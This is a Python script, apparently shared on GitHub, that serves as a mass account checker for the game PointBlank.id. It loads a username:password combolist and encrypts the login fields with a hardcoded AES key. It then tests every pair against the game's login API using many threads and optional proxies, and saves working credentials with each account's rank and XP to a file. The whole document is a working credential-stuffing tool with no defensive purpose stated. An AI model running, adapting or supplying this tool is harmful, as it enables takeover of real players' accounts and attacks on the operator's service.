import requests
import base64
from Crypto.Cipher import AES
from urllib.parse import quote
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Back, Style

init(autoreset=True)

BASE_URL = "https://capp.pointblank.id:18443"

ENCRYPT_KEY = b"zib0ottepez0ppaczib0ottepez0ppac"
ENCRYPT_IV = b"fedcba9876543210"
COUNTRY_CODE = "ID"

RANKS = [
    {"id": 0, "rank": "Private"},
    {"id": 1, "rank": "Private Second Class"},
    {"id": 2, "rank": "Private First Class"},
    {"id": 3, "rank": "Corporal"},
    {"id": 4, "rank": "Sergeant"},
    {"id": 5, "rank": "Staff Sergeant Grade 1"},
    {"id": 6, "rank": "Staff Sergeant Grade 2"},
    {"id": 7, "rank": "Staff Sergeant Grade 3"},
    {"id": 8, "rank": "Sergeant 1st Class Grade 1"},
    {"id": 9, "rank": "Sergeant 1st Class Grade 2"},
    {"id": 10, "rank": "Sergeant 1st Class Grade 3"},
    {"id": 11, "rank": "Sergeant 1st Class Grade 4"},
    {"id": 12, "rank": "Master Sergeant Grade 1"},
    {"id": 13, "rank": "Master Sergeant Grade 2"},
    {"id": 14, "rank": "Master Sergeant Grade 3"},
    {"id": 15, "rank": "Master Sergeant Grade 4"},
    {"id": 16, "rank": "Master Sergeant Grade 5"},
    {"id": 17, "rank": "2nd Lieutenant Grade 1"},
    {"id": 18, "rank": "2nd Lieutenant Grade 2"},
    {"id": 19, "rank": "2nd Lieutenant Grade 3"},
    {"id": 20, "rank": "2nd Lieutenant Grade 4"},
    {"id": 21, "rank": "1st Lieutenant Grade 1"},
    {"id": 22, "rank": "1st Lieutenant Grade 2"},
    {"id": 23, "rank": "1st Lieutenant Grade 3"},
    {"id": 24, "rank": "1st Lieutenant Grade 4"},
    {"id": 25, "rank": "1st Lieutenant Grade 5"},
    {"id": 26, "rank": "Captain Grade 1"},
    {"id": 27, "rank": "Captain Grade 2"},
    {"id": 28, "rank": "Captain Grade 3"},
    {"id": 29, "rank": "Captain Grade 4"},
    {"id": 30, "rank": "Captain Grade 5"},
    {"id": 31, "rank": "Major Grade 1"},
    {"id": 32, "rank": "Major Grade 2"},
    {"id": 33, "rank": "Major Grade 3"},
    {"id": 34, "rank": "Major Grade 4"},
    {"id": 35, "rank": "Major Grade 5"},
    {"id": 36, "rank": "Lieutenant Colonel Grade 1"},
    {"id": 37, "rank": "Lieutenant Colonel Grade 2"},
    {"id": 38, "rank": "Lieutenant Colonel Grade 3"},
    {"id": 39, "rank": "Lieutenant Colonel Grade 4"},
    {"id": 40, "rank": "Lieutenant Colonel Grade 5"},
    {"id": 41, "rank": "Colonel Grade 1"},
    {"id": 42, "rank": "Colonel Grade 2"},
    {"id": 43, "rank": "Colonel Grade 3"},
    {"id": 44, "rank": "Colonel Grade 4"},
    {"id": 45, "rank": "Colonel Grade 5"},
    {"id": 46, "rank": "Brigadier"},
    {"id": 47, "rank": "Major General"},
    {"id": 48, "rank": "Lieutenant General"},
    {"id": 49, "rank": "General"},
    {"id": 50, "rank": "Commander"},
    {"id": 51, "rank": "Hero"},
    {"id": 52, "rank": "Traini"},
    {"id": 53, "rank": "GM"},
    {"id": 54, "rank": "MOD"}
]

def show_banner():
    banner = """
      ╔══════════════════════════════════════════════╗
      ║      PointBlank.id Mass Acount Checker       ║
      ║     Github: https://github.com/im-hanzou     ║
      ╚══════════════════════════════════════════════╝
    """
    print(Fore.CYAN + banner)

def pad_string(s):
    pad_len = 16 - (len(s) % 16)
    return s + ('\0' * pad_len)

def encrypt_parameter(plaintext: str) -> str:
    plaintext_padded = pad_string(plaintext)
    cipher = AES.new(ENCRYPT_KEY, AES.MODE_CBC, ENCRYPT_IV)
    encrypted_bytes = cipher.encrypt(plaintext_padded.encode('utf-8'))
    encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
    encrypted_urlencoded = quote(encrypted_b64)
    return encrypted_urlencoded

def get_rank_name(rank_id):
    for rank in RANKS:
        if rank["id"] == rank_id:
            return rank["rank"]
    return f"Unknown Rank (ID: {rank_id})"

def perform_login(user_id: str, password: str, proxy=None):
    encrypted_country = encrypt_parameter(COUNTRY_CODE)
    encrypted_user = encrypt_parameter(user_id)
    encrypted_pass = encrypt_parameter(password)

    url = f"{BASE_URL}/account/accountlogin?countryCode={encrypted_country}&userId={encrypted_user}&userPasswd={encrypted_pass}"
    headers = {
        'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': 'okhttp/3.12.1',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.post(url, headers=headers, data="", timeout=60, proxies=proxy)
        return response.json()
    except Exception as e:
        return {"code": -1, "message": f"Network error: {str(e)}"}

def get_soldier_info(token: str, uid: int, proxy=None):
    encrypted_token = encrypt_parameter(token)
    encrypted_uid = encrypt_parameter(str(uid))
    url = f"{BASE_URL}/users/soldierinfo?token={encrypted_token}&uid={encrypted_uid}"
    headers = {
        'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': 'okhttp/3.12.1',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.post(url, headers=headers, data="", timeout=60, proxies=proxy)
        return response.json()
    except Exception as e:
        return {"code": -1, "message": f"Network error: {str(e)}"}

def check_single_account(user_id, password, proxy=None):
    try:
        print(f"{Fore.YELLOW}[*] Checking: {Fore.WHITE}{user_id}")
        
        login_result = perform_login(user_id, password, proxy)
        
        if login_result.get("code") != 0 or "data" not in login_result or not login_result["data"].get("token"):
            print(f"{Fore.RED}❌ {user_id}: Login failed")
            return None
        
        token = login_result["data"]["token"]
        uid = login_result["data"]["uid"]
        
        user_data_result = get_soldier_info(token, uid, proxy)
        
        if user_data_result.get("code") != 0 or "data" not in user_data_result:
            print(f"{Fore.RED}❌ {user_id}: Failed to get user details")
            return None
        
        data = user_data_result["data"]
        rank_id = data.get('i32Rank', 0)
        
        account_info = {
            'UserID': user_id,
            'Password': password,
            'Rank': get_rank_name(rank_id),
            'Exp': data.get('i32Exp', 0)
        }
        
        print(f"{Fore.GREEN}✅ {user_id}: Valid account found! {Fore.CYAN}[{account_info['Rank']} - {account_info['Exp']:,} XP]")
        
        save_valid_account(account_info)
        
        return account_info
        
    except Exception as e:
        print(f"{Fore.RED}❌ {user_id}: Error - {str(e)}")
        return None

def load_accounts_from_file(filename):
    accounts = []
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            for line_num, line in enumerate(file, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                if ':' in line:
                    username, password = line.split(':', 1)
                    username = username.strip()
                    password = password.strip()
                    accounts.append((username, password))
                else:
                    print(f"{Fore.YELLOW}⚠️  Line {line_num}: No colon separator found - {line}")
        
        return accounts
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File '{filename}' not found!")
        return []
    except UnicodeDecodeError:
        try:
            with open(filename, 'r', encoding='latin-1') as file:
                for line_num, line in enumerate(file, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    if ':' in line:
                        username, password = line.split(':', 1)
                        username = username.strip()
                        password = password.strip()
                        accounts.append((username, password))
                    else:
                        print(f"{Fore.YELLOW}⚠️  Line {line_num}: No colon separator found - {line}")
            
            return accounts
        except Exception as e:
            print(f"{Fore.RED}❌ Error reading file with different encoding: {str(e)}")
            return []
    except Exception as e:
        print(f"{Fore.RED}❌ Error reading file: {str(e)}")
        return []

def save_valid_account(account, filename="validlogin.txt"):
    try:
        with open(filename, 'a', encoding='utf-8') as file:
            file.write(f"UserID: {account['UserID']}\n")
            file.write(f"Password: {account['Password']}\n")
            file.write(f"Rank: {account['Rank']}\n")
            file.write(f"Exp: {account['Exp']:,}\n")
            file.write("-" * 40 + "\n")
        
        #print(f"{Fore.GREEN}✅ {account['UserID']}: Saved to '{filename}'")
    except Exception as e:
        print(f"{Fore.RED}❌ Error saving account: {str(e)}")

def mass_check_accounts():
    show_banner()
    input_file = input(f"{Fore.WHITE}Enter combolist filename (format: username:password): {Fore.YELLOW}").strip()
    
    if not input_file:
        print(f"{Fore.RED}❌ No filename provided!")
        return
    
    print(f"\n{Fore.YELLOW}[*] Loading accounts from '{input_file}'...")
    accounts = load_accounts_from_file(input_file)
    
    if not accounts:
        print(f"{Fore.RED}❌ No valid accounts found in file!")
        return
    
    print(f"{Fore.GREEN}✅ Loaded {len(accounts)} accounts")
    
    proxy_input = input(f"\n{Fore.WHITE}Enter proxy (http://user:pass@host:port or press Enter if no proxy): {Fore.YELLOW}").strip()
    proxy = None
    
    if proxy_input:
        if proxy_input.startswith('http://'):
            proxy = {'http': proxy_input, 'https': proxy_input}
            print(f"{Fore.GREEN}✅ Proxy loaded")
        else:
            print(f"{Fore.RED}❌ Invalid proxy format!")
    
    try:
        max_threads = int(input(f"{Fore.WHITE}Enter number of threads (default=50): {Fore.YELLOW}").strip() or "50")
        max_threads = max(1, max_threads)
    except ValueError:
        max_threads = 50
    
    print(f"\n{Fore.CYAN}[*] Starting mass check with {max_threads} threads...")
    if proxy:
        print(f"{Fore.CYAN}[*] Using proxy: {proxy['http']}")
    print(f"{Fore.CYAN}{'=' * 60}")
    
    valid_accounts = []
    checked_count = 0
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_account = {
            executor.submit(check_single_account, username, password, proxy): (username, password)
            for username, password in accounts
        }
        
        for future in as_completed(future_to_account):
            checked_count += 1
            account_info = future.result()
            
            if account_info:
                valid_accounts.append(account_info)    
            #progress = (checked_count/len(accounts)*100)
            #print(f"{Fore.MAGENTA}[{checked_count}/{len(accounts)}] Progress: {progress:.1f}%")
            
    
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f"{Fore.CYAN}                     RESULTS SUMMARY")
    print(f"{Fore.CYAN}{'=' * 60}")
    print(f"{Fore.WHITE}Total accounts checked: {Fore.YELLOW}{len(accounts)}")
    print(f"{Fore.WHITE}Valid accounts found: {Fore.GREEN}{len(valid_accounts)}")
    print(f"{Fore.WHITE}Invalid accounts: {Fore.RED}{len(accounts) - len(valid_accounts)}")
    
    if valid_accounts:
        print(f"\n{Fore.GREEN}[*] Valid accounts found:")
        for i, account in enumerate(valid_accounts, 1):
            print(f"{Fore.WHITE}{i}. {Fore.CYAN}{account['UserID']} {Fore.WHITE}- {Fore.YELLOW}{account['Rank']} {Fore.WHITE}({Fore.GREEN}{account['Exp']:,} XP{Fore.WHITE})")
        
        print(f"\n{Fore.GREEN}✅ All valid accounts have been saved to 'validlogin.txt'")
    else:
        print(f"\n{Fore.RED}❌ No valid accounts found!")
    
    print(f"{Fore.CYAN}{'=' * 60}")

def main():
    try:
        mass_check_accounts()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}❌ Process interrupted by user!")
    except Exception as e:
        print(f"\n{Fore.RED}❌ An unexpected error occurred: {str(e)}")

if __name__ == "__main__":
    main()
